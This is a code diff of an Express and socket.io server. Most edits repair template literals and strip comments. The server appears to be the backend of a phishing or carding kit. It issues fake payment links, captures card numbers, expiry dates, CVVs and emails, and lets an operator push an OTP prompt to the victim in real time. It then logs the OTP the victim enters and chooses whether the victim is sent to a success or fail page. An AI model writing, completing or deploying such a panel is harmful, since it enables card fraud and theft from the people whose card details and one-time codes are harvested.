@@ -10,7 +10,7 @@ const app = express();
 app.use(bodyParser.json());
 app.use(cors());
 
-// Serve static files from the "public" directory (adjust as needed)
+// Serve static files from the "public" directory
 app.use(express.static('public'));
 
 // Create HTTP server and wrap the Express app
@@ -31,23 +31,18 @@ const paymentLinks = new Map();
 // Socket.io connection listener
 io.on('connection', (socket) => {
   console.log('A client connected:', socket.id);
-
-  // Optionally, join a room if an invoiceId is sent from client:
   socket.on('join', (invoiceId) => {
     socket.join(invoiceId);
-    console.log(Socket ${socket.id} joined room ${invoiceId});
+    console.log(`Socket ${socket.id} joined room ${invoiceId}`);
   });
-
-  // You can also emit events to all sockets in a room:
-  // socket.to(invoiceId).emit('show_otp', { invoiceId });
 });
 
 // Endpoint to generate a payment link (which leads to landing.html)
 app.post('/api/generatePaymentLink', (req, res) => {
   const { amount, description } = req.body;
   const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
-  // Construct a link that passes the invoiceId as pid
-  const paymentLink = ${req.protocol}://${req.get('host')}/landing.html?pid=${invoiceId};
+  // Construct a link that passes the invoiceId as pid in landing.html
+  const paymentLink = `${req.protocol}://${req.get('host')}/landing.html?pid=${invoiceId}`;
   paymentLinks.set(invoiceId, { amount, description, paymentLink, createdAt: new Date().toISOString() });
   console.log("Payment link generated:", paymentLink);
   res.json({ status: "success", paymentLink });
@@ -85,7 +80,7 @@ app.post('/api/sendPaymentDetails', (req, res) => {
   const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
   const transaction = {
     id: invoiceId,
-    cardNumber, // already cleaned on client side
+    cardNumber,
     expiry,
     cvv,
     email,
@@ -115,7 +110,6 @@ app.post('/api/showOTP', (req, res) => {
   txn.otpShown = true;
   txn.status = 'otp_pending';
   txn.otpError = false;
-  // Emit a socket.io event to the room corresponding to invoiceId so clients update in real time
   io.to(invoiceId).emit('show_otp', { invoiceId });
   res.json({ status: "success", message: "OTP form will be shown to user" });
 });
@@ -144,8 +138,8 @@ app.get('/api/checkTransactionStatus', (req, res) => {
   }
   if (txn.redirectStatus) {
     const redirectUrl = txn.redirectStatus === 'success'
-      ? /success.html?invoiceId=${invoiceId}
-      : /fail.html?invoiceId=${invoiceId};
+      ? `/success.html?invoiceId=${invoiceId}`
+      : `/fail.html?invoiceId=${invoiceId}`;
     return res.json({ status: "redirect", redirectUrl });
   }
   res.json({ status: txn.status, otpError: txn.otpError });
@@ -161,7 +155,7 @@ app.post('/api/submitOTP', (req, res) => {
   txn.otpEntered = otp;
   txn.status = 'otp_received';
   txn.otpError = false;
-  console.log(OTP received for transaction ${invoiceId}: ${otp});
+  console.log(`OTP received for transaction ${invoiceId}: ${otp}`);
   res.json({ status: "success", message: "OTP received" });
 });
 
@@ -173,26 +167,24 @@ app.post('/api/updateRedirectStatus', (req, res) => {
     return res.status(404).json({ status: "error", message: "Transaction not found" });
   }
   txn.redirectStatus = redirectStatus;
-  console.log(Transaction ${invoiceId} redirect status updated to: ${redirectStatus});
-  // Emit a socket.io event to notify clients for immediate redirection
+  console.log(`Transaction ${invoiceId} redirect status updated to: ${redirectStatus}`);
   io.to(invoiceId).emit('redirect', {
     redirectUrl: redirectStatus === 'success'
-      ? /success.html?invoiceId=${invoiceId}
-      : /fail.html?invoiceId=${invoiceId}
+      ? `/success.html?invoiceId=${invoiceId}`
+      : `/fail.html?invoiceId=${invoiceId}`
   });
   res.json({
     status: "success",
     invoiceId,
     redirectStatus,
     redirectUrl: redirectStatus === 'success'
-      ? /success.html?invoiceId=${invoiceId}
-      : /fail.html?invoiceId=${invoiceId}
+      ? `/success.html?invoiceId=${invoiceId}`
+      : `/fail.html?invoiceId=${invoiceId}`
   });
 });
 
-// Start the server (using our HTTP server with socket.io)
+// Start the server
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-  console.log(Server running on port ${PORT});
+  console.log(`Server running on port ${PORT}`);
 });
-
